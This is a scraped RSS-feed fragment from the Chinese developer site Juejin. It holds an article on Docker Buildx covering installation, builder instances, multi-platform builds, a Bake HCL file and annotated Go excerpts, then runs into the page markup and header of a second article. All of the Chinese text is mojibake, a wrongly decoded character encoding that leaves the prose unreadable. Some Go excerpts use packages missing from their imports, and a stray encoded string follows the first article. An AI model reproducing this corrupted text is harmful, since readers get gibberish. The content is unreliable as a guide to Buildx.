<li><strong>å¤šå¹³å°æ„å»º</strong>ï¼šæ— éœ€æ¨¡æ‹Ÿï¼Œå³å¯ä¸ºå¤šç§æ¶æ„ï¼ˆå¦‚ linux/amd64, linux/arm64ï¼‰æ„å»ºé•œåƒã€‚</li>
<li><strong>Compose æ„å»ºæ”¯æŒ</strong>ï¼šç›´æ¥ä» Docker Compose æ–‡ä»¶æ„å»ºæœåŠ¡é•œåƒã€‚</li>
<li><strong>Bake é«˜çº§æ„å»º</strong>ï¼šé€šè¿‡å£°æ˜å¼é…ç½®æ–‡ä»¶ï¼ˆHCL æˆ– JSONï¼‰å®šä¹‰å’Œæ„å»ºå¤æ‚çš„å¤šç›®æ ‡æ„å»ºå·¥ä½œæµã€‚</li>
<li><strong>å®¹å™¨å†…é©±åŠ¨ç¨‹åºæ”¯æŒ</strong>ï¼šæ”¯æŒåœ¨ Docker å®¹å™¨å’Œ Kubernetes Pod ä¸­è¿è¡Œæ„å»ºå™¨ã€‚</li>
</ul>
<h3 data-id="heading-2">å®‰è£…æŒ‡å—</h3>
<p>ä½¿ç”¨ Buildx éœ€è¦ Docker Engine 19.03 æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚</p>
<blockquote>
<p><strong>è­¦å‘Š</strong>ï¼šä½¿ç”¨ä¸å…¼å®¹çš„ Docker ç‰ˆæœ¬å¯èƒ½å¯¼è‡´æ„å¤–è¡Œä¸ºï¼Œå¹¶å¾ˆå¯èƒ½å¼•å‘é—®é¢˜ã€‚</p>
</blockquote>
<h4 data-id="heading-3">Windows å’Œ macOS</h4>
<p>Docker Desktop å·²å†…ç½® Buildxï¼Œæ— éœ€é¢å¤–å®‰è£…ã€‚</p>
<h4 data-id="heading-4">Linux åŒ…ç®¡ç†å™¨å®‰è£…</h4>
<p>å¯ä»¥é€šè¿‡ç³»ç»Ÿçš„åŒ…ç®¡ç†å™¨è¿›è¡Œå®‰è£…ï¼š</p>
<ul>
<li><strong>Debian/Ubuntu</strong>: <code>apt-get install docker-buildx-plugin</code></li>
<li><strong>RHEL/Fedora</strong>: <code>yum install docker-buildx-plugin</code></li>
</ul>
<h4 data-id="heading-5">æ‰‹åŠ¨ä¸‹è½½</h4>
<p>ä» <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdocker%2Fbuildx%2Freleases" target="_blank" title="https://github.com/docker/buildx/releases" ref="nofollow noopener noreferrer">GitHub Releases</a> é¡µé¢ä¸‹è½½é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°†å…¶æ”¾ç½®äº Docker æ’ä»¶ç›®å½•ä¸‹ï¼ˆä¾‹å¦‚ <code>~/.docker/cli-plugins/</code>ï¼‰ï¼Œå¹¶ç¡®ä¿å…¶å…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚</p>
<h4 data-id="heading-6">ä½¿ç”¨ Dockerfile</h4>
<p>æ‚¨ä¹Ÿå¯ä»¥åœ¨ Dockerfile ä¸­ä½¿ç”¨ <code>FROM --platform=$BUILDPLATFORM</code> æŒ‡ä»¤ï¼Œé…åˆ Buildx åœ¨å¤šé˜¶æ®µæ„å»ºä¸­å¤åˆ¶äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p>
<h4 data-id="heading-7">å®‰è£…ä¸º Docker CLI æ’ä»¶åˆ«å</h4>
<p>è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå°† Buildx è®¾ç½®ä¸º <code>docker builder</code> çš„åˆ«åï¼ˆæ—§ç‰ˆæ–¹å¼ï¼Œç°å·²ä¸æ¨èï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker buildx install
</code></pre>
<p>è‹¥è¦ç§»é™¤åˆ«åï¼Œè¯·è¿è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker buildx uninstall
</code></pre>
<h3 data-id="heading-8">ä½¿ç”¨è¯´æ˜</h3>
<h4 data-id="heading-9">åŸºæœ¬æ„å»º</h4>
<p>ä½¿ç”¨ <code>buildx build</code> å‘½ä»¤è¿›è¡Œæ„å»ºï¼Œå…¶å‚æ•°ä¸ <code>docker build</code> ç±»ä¼¼ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker buildx build -t your-image:tag .
</code></pre>
<h4 data-id="heading-10">ç®¡ç†æ„å»ºå™¨å®ä¾‹</h4>
<p>Buildx æ”¯æŒå¤šä¸ªæ„å»ºå™¨å®ä¾‹ã€‚æŸ¥çœ‹å½“å‰å®ä¾‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker buildx <span class="hljs-built_in">ls</span>
</code></pre>
<p>åˆ›å»ºæ–°çš„æ„å»ºå™¨å®ä¾‹ï¼ˆä¾‹å¦‚ä½¿ç”¨ <code>docker-container</code> é©±åŠ¨ç¨‹åºï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker buildx create --name mybuilder --driver docker-container --use
</code></pre>
<p><code>--use</code> æ ‡å¿—ä¼šç«‹å³åˆ‡æ¢åˆ°æ–°åˆ›å»ºçš„æ„å»ºå™¨ã€‚</p>
<h4 data-id="heading-11">æ„å»ºå¤šå¹³å°é•œåƒ</h4>
<p>è¿™æ˜¯ Buildx çš„æ ¸å¿ƒä¼˜åŠ¿ä¹‹ä¸€ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ <code>--platform</code> æ ‡å¿—æŒ‡å®šå¤šä¸ªå¹³å°ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker buildx build --platform linux/amd64,linux/arm64 -t your-image:multiarch .
</code></pre>
<p>ä¸ºäº†æˆåŠŸæ„å»ºå¤šå¹³å°é•œåƒï¼Œéœ€è¦ç¡®ä¿æ‚¨çš„æ„å»ºå™¨æ”¯æŒå¤šå¹³å°ï¼ˆé€šå¸¸å®¹å™¨é©±åŠ¨ç¨‹åºæ”¯æŒï¼‰ï¼Œå¹¶ä¸”å¯èƒ½éœ€è¦é…ç½® <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftonistiigi%2Fbinfmt" target="_blank" title="https://github.com/tonistiigi/binfmt" ref="nofollow noopener noreferrer">binfmt_misc</a> æ¥æ³¨å†Œä»¿çœŸå™¨ã€‚</p>
<h4 data-id="heading-12">ä½¿ç”¨ Bake è¿›è¡Œé«˜çº§æ„å»º</h4>
<p>Bake å…è®¸æ‚¨ä½¿ç”¨ HCL æˆ– JSON æ–‡ä»¶å®šä¹‰æ„å»ºç›®æ ‡ã€‚åˆ›å»ºä¸€ä¸ª <code>docker-bake.hcl</code> æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-hcl" lang="hcl">variable "TAG" {
  default = "latest"
}

group "default" {
  targets = ["app", "db"]
}

target "app" {
  context = "."
  dockerfile = "Dockerfile.app"
  tags = ["your-registry/app:${TAG}"]
}

target "db" {
  context = "./db"
  dockerfile = "Dockerfile"
  tags = ["your-registry/db:${TAG}"]
}
</code></pre>
<p>ç„¶åè¿è¡Œæ„å»ºï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker buildx bake --<span class="hljs-built_in">set</span> *.tags=your-registry/my-app:custom-tag
</code></pre>
<p>Bake æ”¯æŒä»å¤šä¸ªæ–‡ä»¶ï¼ˆåŒ…æ‹¬ Docker Compose æ–‡ä»¶ï¼‰è¯»å–é…ç½®ï¼Œå¹¶å…è®¸é€šè¿‡å‘½ä»¤è¡Œè¿›è¡Œè¦†ç›–ã€‚</p>
<h3 data-id="heading-13">æ ¸å¿ƒä»£ç </h3>
<p>ä»¥ä¸‹æ˜¯ä» Buildx é¡¹ç›®ä¸­æå–çš„ä¸€äº›æ ¸å¿ƒä»£ç ç‰‡æ®µï¼Œå±•ç¤ºäº†å…¶å†…éƒ¨å·¥ä½œæœºåˆ¶ã€‚</p>
<h4 data-id="heading-14">Bake é…ç½®æ–‡ä»¶è§£æ</h4>
<p><code>bake</code> åŒ…è´Ÿè´£è§£æ Bake çš„é…ç½®æ–‡ä»¶ï¼ˆHCL/JSON/Composeï¼‰ã€‚ä»¥ä¸‹ä»£ç å±•ç¤ºäº†å¦‚ä½•è¯»å–å’Œåˆå¹¶æœ¬åœ°æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// åŒ… bake è´Ÿè´£è§£æå’Œå¤„ç† Bake é…ç½®æ–‡ä»¶ã€‚</span>
<span class="hljs-keyword">package</span> bake

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"context"</span>
	<span class="hljs-string">"io"</span>
	<span class="hljs-string">"os"</span>
	<span class="hljs-string">"path/filepath"</span>
	<span class="hljs-string">"slices"</span>
	<span class="hljs-string">"strings"</span>
)

<span class="hljs-comment">// File ç»“æ„ä½“è¡¨ç¤ºä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼ŒåŒ…å«æ–‡ä»¶åå’Œå†…å®¹ã€‚</span>
<span class="hljs-keyword">type</span> File <span class="hljs-keyword">struct</span> {
	Name <span class="hljs-type">string</span>
	Data []<span class="hljs-type">byte</span>
}

<span class="hljs-comment">// ReadLocalFiles è¯»å–æŒ‡å®šçš„é…ç½®æ–‡ä»¶åˆ—è¡¨ã€‚å¦‚æœæœªæä¾›æ–‡ä»¶åï¼Œåˆ™ä½¿ç”¨é»˜è®¤æ–‡ä»¶ååˆ—è¡¨ã€‚</span>
<span class="hljs-comment">// å®ƒæ”¯æŒä»æ ‡å‡†è¾“å…¥ï¼ˆ"-"ï¼‰è¯»å–ï¼Œå¹¶ä¼šä¸ºä¸å­˜åœ¨çš„é»˜è®¤æ–‡ä»¶è·³è¿‡é”™è¯¯ã€‚</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadLocalFiles</span><span class="hljs-params">(names []<span class="hljs-type">string</span>, stdin io.Reader, l progress.SubLogger)</span></span> ([]File, <span class="hljs-type">error</span>) {
	isDefault := <span class="hljs-literal">false</span>
	<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(names) == <span class="hljs-number">0</span> {
		isDefault = <span class="hljs-literal">true</span>
		names = defaultFilenames() <span class="hljs-comment">// è·å–é»˜è®¤æ–‡ä»¶ååˆ—è¡¨ï¼Œå¦‚ docker-bake.hcl, docker-compose.yml ç­‰</span>
	}
	out := <span class="hljs-built_in">make</span>([]File, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(names))

	<span class="hljs-comment">// è®¾ç½®è¿›åº¦æ—¥å¿—çŠ¶æ€çš„å›è°ƒå‡½æ•°</span>
	setStatus := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(st *client.VertexStatus)</span></span> {
		<span class="hljs-keyword">if</span> l != <span class="hljs-literal">nil</span> {
			l.SetStatus(st)
		}
	}

	<span class="hljs-keyword">for</span> _, n := <span class="hljs-keyword">range</span> names {
		<span class="hljs-keyword">var</span> dt []<span class="hljs-type">byte</span>
		<span class="hljs-keyword">var</span> err <span class="hljs-type">error</span>
		<span class="hljs-keyword">if</span> n == <span class="hljs-string">"-"</span> {
			<span class="hljs-comment">// ä»æ ‡å‡†è¾“å…¥è¯»å–</span>
			dt, err = readWithProgress(stdin, setStatus)
			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
				<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
			}
		} <span class="hljs-keyword">else</span> {
			<span class="hljs-comment">// ä»æ–‡ä»¶è¯»å–ï¼Œå¦‚æœæ˜¯é»˜è®¤æ–‡ä»¶ä¸”ä¸å­˜åœ¨ï¼Œåˆ™é™é»˜è·³è¿‡ã€‚</span>
			dt, err = readFileWithProgress(n, isDefault, setStatus)
			<span class="hljs-keyword">if</span> dt == <span class="hljs-literal">nil</span> &amp;&amp; err == <span class="hljs-literal">nil</span> {
				<span class="hljs-keyword">continue</span>
			}
			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
				<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
			}
		}
		out = <span class="hljs-built_in">append</span>(out, File{Name: n, Data: dt})
	}
	<span class="hljs-keyword">return</span> out, <span class="hljs-literal">nil</span>
}
</code></pre>
<h4 data-id="heading-15">HCL è§£æå™¨ä¸­çš„å‡½æ•°è°ƒç”¨æå–</h4>
<p><code>hclparser</code> åŒ…åŒ…å«ç”¨äºå¤„ç† HCL é…ç½®çš„å®ç”¨å‡½æ•°ã€‚ä»¥ä¸‹ä»£ç å±•ç¤ºäº†å¦‚ä½•ä» HCL è¡¨è¾¾å¼ä¸­æå–å‡½æ•°è°ƒç”¨ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// åŒ… hclparser æä¾›äº†è§£æå’Œå¤„ç† HCL é…ç½®æ–‡ä»¶çš„å·¥å…·ã€‚</span>
<span class="hljs-keyword">package</span> hclparser

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"reflect"</span>
	<span class="hljs-string">"unsafe"</span>

	<span class="hljs-string">"github.com/hashicorp/hcl/v2"</span>
	<span class="hljs-string">"github.com/hashicorp/hcl/v2/hclsyntax"</span>
	<span class="hljs-string">"github.com/pkg/errors"</span>
)

<span class="hljs-comment">// funcCalls é€’å½’éå† HCL è¡¨è¾¾å¼ï¼Œæ”¶é›†å…¶ä¸­æ‰€æœ‰å‡½æ•°è°ƒç”¨çš„åç§°ã€‚</span>
<span class="hljs-comment">// å®ƒå¤„ç†åŸç”Ÿçš„ hclsyntax è¡¨è¾¾å¼å’Œ JSON æ ¼å¼çš„è¡¨è¾¾å¼ã€‚</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">funcCalls</span><span class="hljs-params">(exp hcl.Expression)</span></span> ([]<span class="hljs-type">string</span>, hcl.Diagnostics) {
	node, ok := exp.(hclsyntax.Node)
	<span class="hljs-keyword">if</span> !ok {
		<span class="hljs-comment">// å¯¹äº JSON è¡¨è¾¾å¼ï¼Œä½¿ç”¨é€’å½’å‡½æ•°å¤„ç†</span>
		fns, err := jsonFuncCallsRecursive(exp)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, wrapErrorDiagnostic(<span class="hljs-string">"Invalid expression"</span>, err, exp.Range().Ptr(), exp.Range().Ptr())
		}
		<span class="hljs-keyword">return</span> fns, <span class="hljs-literal">nil</span>
	}

	<span class="hljs-keyword">var</span> funcnames []<span class="hljs-type">string</span>
	<span class="hljs-comment">// ä½¿ç”¨ hclsyntax.VisitAll éå†è¯­æ³•æ ‘èŠ‚ç‚¹</span>
	hcldiags := hclsyntax.VisitAll(node, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(n hclsyntax.Node)</span></span> hcl.Diagnostics {
		<span class="hljs-keyword">if</span> fe, ok := n.(*hclsyntax.FunctionCallExpr); ok {
			funcnames = <span class="hljs-built_in">append</span>(funcnames, fe.Name) <span class="hljs-comment">// æ”¶é›†å‡½æ•°å</span>
		}
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
	})
	<span class="hljs-keyword">if</span> hcldiags.HasErrors() {
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, hcldiags
	}
	<span class="hljs-keyword">return</span> funcnames, <span class="hljs-literal">nil</span>
}
</code></pre>
<h4 data-id="heading-16">é©±åŠ¨ç¨‹åºæ¥å£ä¸å®ç°</h4>
<p><code>driver</code> åŒ…å®šä¹‰äº†æ„å»ºå™¨é©±åŠ¨ç¨‹åºçš„é€šç”¨æ¥å£ï¼Œä¸åŒçš„é©±åŠ¨ç¨‹åºï¼ˆå¦‚ <code>docker-container</code>, <code>kubernetes</code>ï¼‰éƒ½å®ç°æ­¤æ¥å£ã€‚ä»¥ä¸‹ä»£ç å±•ç¤ºäº†é©±åŠ¨ç¨‹åºä¿¡æ¯æŸ¥è¯¢å’Œå®¢æˆ·ç«¯è¿æ¥çš„æ ¸å¿ƒæ–¹æ³•ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// åŒ… driver å®šä¹‰äº†æ„å»ºå™¨é©±åŠ¨ç¨‹åºçš„æ¥å£å’ŒåŸºç¡€ç»“æ„ã€‚</span>
<span class="hljs-keyword">package</span> driver

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"context"</span>
	<span class="hljs-string">"net"</span>
	<span class="hljs-string">"sync"</span>
	<span class="hljs-string">"time"</span>

	<span class="hljs-string">"github.com/moby/buildkit/client"</span>
	<span class="hljs-string">"github.com/pkg/errors"</span>
)

<span class="hljs-comment">// Driver æ¥å£æ˜¯æ‰€æœ‰ Buildx é©±åŠ¨ç¨‹åºï¼ˆå¦‚ dockerã€docker-containerã€kubernetesã€remoteï¼‰å¿…é¡»å®ç°çš„å¥‘çº¦ã€‚</span>
<span class="hljs-keyword">type</span> Driver <span class="hljs-keyword">interface</span> {
	Factory() Factory
	Bootstrap(context.Context, progress.Logger) <span class="hljs-type">error</span>
	Info(context.Context) (*Info, <span class="hljs-type">error</span>)
	Version(context.Context) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)
	Stop(ctx context.Context, force <span class="hljs-type">bool</span>) <span class="hljs-type">error</span>
	Rm(ctx context.Context, force, rmVolume, rmDaemon <span class="hljs-type">bool</span>) <span class="hljs-type">error</span>
	Dial(ctx context.Context) (net.Conn, <span class="hljs-type">error</span>)
	Client(ctx context.Context, opts ...client.ClientOpt) (*client.Client, <span class="hljs-type">error</span>)
	Features(ctx context.Context) <span class="hljs-keyword">map</span>[Feature]<span class="hljs-type">bool</span>
	HostGatewayIP(ctx context.Context) (net.IP, <span class="hljs-type">error</span>)
	IsMobyDriver() <span class="hljs-type">bool</span>
	Config() InitConfig
}

<span class="hljs-comment">// Boot æ˜¯ä¸€ä¸ªè¾…åŠ©å‡½æ•°ï¼Œç”¨äºå¼•å¯¼é©±åŠ¨ç¨‹åºå¹¶è·å– BuildKit å®¢æˆ·ç«¯ã€‚</span>
<span class="hljs-comment">// å®ƒä¼šå°è¯•å¯åŠ¨é©±åŠ¨ç¨‹åºï¼ˆå¦‚æœå°šæœªè¿è¡Œï¼‰ï¼Œå¹¶åœ¨å¤±è´¥æ—¶é‡è¯•ã€‚</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Boot</span><span class="hljs-params">(ctx, clientContext context.Context, d *DriverHandle, pw progress.Writer)</span></span> (*client.Client, <span class="hljs-type">error</span>) {
	try := <span class="hljs-number">0</span>
	logger := discardLogger
	<span class="hljs-keyword">if</span> pw != <span class="hljs-literal">nil</span> {
		logger = pw.Write
	}

	<span class="hljs-keyword">for</span> {
		info, err := d.Info(ctx) <span class="hljs-comment">// æŸ¥è¯¢é©±åŠ¨ç¨‹åºçŠ¶æ€</span>
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
		}
		try++
		<span class="hljs-keyword">if</span> info.Status != Running {
			<span class="hljs-keyword">if</span> try &gt; <span class="hljs-number">2</span> {
				<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.Errorf(<span class="hljs-string">"failed to bootstrap %T driver in attempts"</span>, d)
			}
			<span class="hljs-comment">// å¦‚æœæœªè¿è¡Œï¼Œåˆ™å°è¯•å¼•å¯¼å¯åŠ¨</span>
			<span class="hljs-keyword">if</span> err := d.Bootstrap(ctx, logger); err != <span class="hljs-literal">nil</span> {
				<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
			}
		}

		<span class="hljs-comment">// è·å– BuildKit å®¢æˆ·ç«¯</span>
		c, err := d.Client(clientContext)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			<span class="hljs-keyword">if</span> errors.Is(err, ErrNotRunning{}) &amp;&amp; try &lt;= <span class="hljs-number">2</span> {
				<span class="hljs-keyword">continue</span> <span class="hljs-comment">// å¦‚æœæ˜¯æœªè¿è¡Œé”™è¯¯ï¼Œä¸”å°è¯•æ¬¡æ•°æœªè¶…ï¼Œåˆ™é‡è¯•å¾ªç¯</span>
			}
			<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
		}
		<span class="hljs-keyword">return</span> c, <span class="hljs-literal">nil</span>
	}
}
</code></pre>
<p>è¿™äº›ä»£ç ç‰‡æ®µä½“ç°äº† Buildx é¡¹ç›®çš„å‡ ä¸ªæ ¸å¿ƒè®¾è®¡ï¼šæ¨¡å—åŒ–ï¼ˆé€šè¿‡é©±åŠ¨ç¨‹åºæ”¯æŒå¤šç§åç«¯ï¼‰ã€å£°æ˜å¼é…ç½®ï¼ˆé€šè¿‡ Bake å’Œ HCLï¼‰ä»¥åŠå¯¹ BuildKit æ‰€æœ‰åŠŸèƒ½çš„å……åˆ†åˆ©ç”¨ã€‚
9sS2xK9ahqK2nmJ3CUBl9PAdseQ0eJ/iRg/0n3QGCFI=</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ„å»ºAIæ™ºèƒ½ä½“ï¼šä¸ƒåå…«ã€å‚æ•°çš„è‰ºæœ¯ï¼šå¦‚ä½•åœ¨æœ‰é™ç®—åŠ›ä¸‹å®ç°é«˜è´¨é‡çš„AIè¯—æ­Œåˆ›ä½œ]]></title>    <link>https://juejin.cn/post/7592853243730886696</link>    <guid>https://juejin.cn/post/7592853243730886696</guid>    <pubDate>2026-01-09T00:06:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592853243730886696" data-draft-id="7592501225003810867" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ„å»ºAIæ™ºèƒ½ä½“ï¼šä¸ƒåå…«ã€å‚æ•°çš„è‰ºæœ¯ï¼šå¦‚ä½•åœ¨æœ‰é™ç®—åŠ›ä¸‹å®ç°é«˜è´¨é‡çš„AIè¯—æ­Œåˆ›ä½œ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,LLM,Python"/> <meta itemprop="datePublished" content="2026-01-09T00:06:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å½¼å²¸èŠ±å¼€äº†å—"/> <meta itemprop="url" content="https://juejin.cn/user/4153315734334538"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ„å»ºAIæ™ºèƒ½ä½“ï¼šä¸ƒåå…«ã€å‚æ•°çš„è‰ºæœ¯ï¼šå¦‚ä½•åœ¨æœ‰é™ç®—åŠ›ä¸‹å®ç°é«˜è´¨é‡çš„AIè¯—æ­Œåˆ›ä½œ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4153315734334538/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å½¼å²¸èŠ±å¼€äº†å—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T00:06:35.000Z" title="Fri Jan 09 2026 00:06:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€å‰è¨€</h2>
